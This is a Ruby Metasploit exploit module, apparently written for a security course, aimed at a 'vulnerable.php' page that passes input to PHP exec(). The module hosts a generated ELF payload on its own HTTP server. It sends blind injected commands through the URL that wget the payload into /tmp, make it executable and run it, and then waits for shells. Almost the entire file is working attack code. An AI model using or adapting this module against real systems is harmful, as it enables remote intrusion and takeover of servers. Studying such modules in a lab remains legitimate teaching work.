require 'msf/core'

    class MetasploitModule < Msf::Exploit
        include Msf::Exploit::EXE
        include Msf::Exploit::Remote::HttpClient
        include Msf::Exploit::Remote::HttpServer::HTML

        def initialize(info = {})
            super(update_info(info,
                'Name'           => 'vulnerable.php Remote Command Execution',
                'Description'    => %q{
                    This exploit module abuses a RCE vuln in caused by a bad example use of a php exec() function
                },
                'Author'         => [ 'ENPM809Q' ],
                'License'        => GPL_LICENSE,
	        'Platform'       => 'linux',
	        'Targets'        =>
        	  [
	            [ 'Automatic', {} ],
	          ],
	        'DefaultTarget'  => 0 ))
            register_options(
                [
                    OptString.new('WRITABLEDIR', [true, 'Path to writable directory on target', '/tmp/']),
                    OptString.new('FILENAME', [true, 'Payload filename', 'evil.elf']),
                    OptAddress.new('SRVHOST', [true, 'HTTP Server Bind Address', '127.0.1.1']),
                    OptInt.new('SRVPORT', [true, 'HTTP Server Port', '4444'])
                ], self.class)
        end
        
    	def on_request_uri(cli, req)
            @pl = generate_payload_exe
    	    print_status("#{peer} - Payload request received: #{req.uri}")
            send_response(cli, @pl)
    	end

        def check
            uri = "/"
            res = send_request_raw({
                'method'   => 'GET',
                'uri'      => normalize_uri(uri, '/',datastore['URIPATH'])
            })
            if res && res.code == 200
               Exploit::CheckCode::Vulnerable
            else
               Exploit::CheckCode::Safe
            end
        end

        def request(cmd)
              uri = "/"
              res = send_request_raw({
                'method'   => 'GET',
                'uri'      => normalize_uri(uri, '/',datastore['URIPATH']+cmd)
              })
              if [200].include?(res.code)
                print_status("#{rhost}:#{rport} - Request sent...")
              else
                fail_with(Failure::Unknown, "#{rhost}:#{rport} - HTTP Request failed")
              end
        end
        def exploit
	     srvhost=datastore['SRVHOST']
	     srvport=datastore['SRVPORT']
             filename = datastore['FILENAME']
             wdir = datastore['WRITABLEDIR']
             resource_uri="/"+filename
	     cmds=[
		"wget+"+srvhost+":"+srvport.to_s+"/"+filename+"+-O+"+wdir+filename,
          	"chmod+777+"+wdir+filename,
		wdir+filename
		]
	         start_service({'Uri' => {
        	    'Proc' => Proc.new { |cli, req|
	             on_request_uri(cli, req)},
	             'Path' => resource_uri
	          }})
              print_status("#{rhost}:#{rport} - Blind Exploitation in 3 requests...")
	      cmds.each do |cmd|
                request(cmd)
                sleep(3)
              end
              print_status("#{srvhost}:#{srvport} - Waiting 3 minutes for shells")
              sleep(150)
        end
    end
